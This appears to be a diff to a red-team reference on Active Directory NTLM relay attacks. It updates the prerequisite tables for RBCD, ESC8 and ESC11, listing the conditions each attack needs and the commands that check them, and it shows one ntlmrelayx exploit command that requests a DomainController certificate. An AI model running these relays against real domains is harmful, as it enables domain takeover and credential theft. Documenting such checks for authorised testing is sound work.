@@ -206,7 +206,7 @@ Relay NTLM to LDAP to write `msDS-AllowedToActOnBehalfOfOtherIdentity` on a targ
 |-------|----------|--------|
 | LDAP signing not enforced | ✅ | `nxc ldap --module ldap-checker` |
 | LDAP channel binding not required | ✅ | `nxc ldap --module ldap-checker` |
-| Domain functional level ≥ 2012 R2 | ✅ | ldap3 `msDS-Behavior-Version` |
+| Domain functional level ≥ 2012 R2 (RBCD support) | ✅ | ldap3 `msDS-Behavior-Version` |
 | Writable computer object exists | ✅ | `bloodyAD get writable --otype COMPUTER` |
 | MachineAccountQuota > 0 | ⚠️ Optional¹ | `nxc ldap --module maq` / ldap3 |
 | WebClient running on target | ⚠️ Optional | `nxc smb --module webdav` |
@@ -244,6 +244,8 @@ Relay to AD CS web enrollment (certsrv) over HTTP. Allows enrolling a certificat
 | AD CS deployed in domain | ✅ | `nxc ldap --module adcs` / certipy / ldap3 |
 | Web enrollment HTTP endpoint reachable | ✅ | TCP port 80 + HTTP GET `/certsrv/` |
 | certsrv uses NTLM auth | ✅ | `WWW-Authenticate: NTLM` header check |
+| Enrollable template with Client Authentication EKU | ✅ | certipy / ldap3 `pKIExtendedKeyUsage` |
+| CA Request Disposition set to Issue | ✅ | certipy `Request Disposition` field |
 | certipy confirms ESC8 | ⚠️ Optional | `certipy-ad find -vulnerable` |
 | HTTPS certsrv EPA not enforced | ⚠️ Optional | Manual registry check |
 
@@ -260,7 +262,9 @@ Relay NTLM over RPC to the ICPR interface on the CA server, bypassing the need f
 | AD CS deployed in domain | ✅ | `nxc ldap --module adcs` / certipy |
 | CA RPC port reachable (TCP 135 + dynamic) | ✅ | TCP check |
 | `IF_ENFORCES_ENCRYPT_ICPR` flag not set | ✅ | certipy / registry check |
-| Enrollable template exists | ⚠️ Optional | certipy |
+| Enrollable template with Client Authentication EKU | ✅ | certipy / ldap3 `pKIExtendedKeyUsage` |
+| CA Request Disposition set to Issue | ✅ | certipy `Request Disposition` field |
+| certipy confirms ESC11 | ⚠️ Optional | `certipy-ad find -vulnerable` |
 
 **Exploit:** `ntlmrelayx.py -t rpc://<ca-host> -rpc-mode ICPR -icpr-ca-name '<ca-name>' --template DomainController`
 
